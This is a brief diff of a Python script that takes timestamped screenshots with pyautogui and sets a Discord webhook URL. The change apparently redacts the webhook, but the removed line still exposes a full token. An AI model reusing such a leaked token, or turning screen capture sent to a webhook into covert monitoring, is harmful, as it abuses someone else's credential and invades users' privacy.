@@ -5,7 +5,7 @@ import os
 import time
 
 # Set the Discord webhook URL here
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1300963600026042368/TqpnT9YV3flawd16ngt9HHclb5GUG6kjLTwXbqANvgIl54JzULgwje8XomT_Vt1vJFiK'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/'
 def take_screenshot():
     filename = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
     screenshot = pyautogui.screenshot()
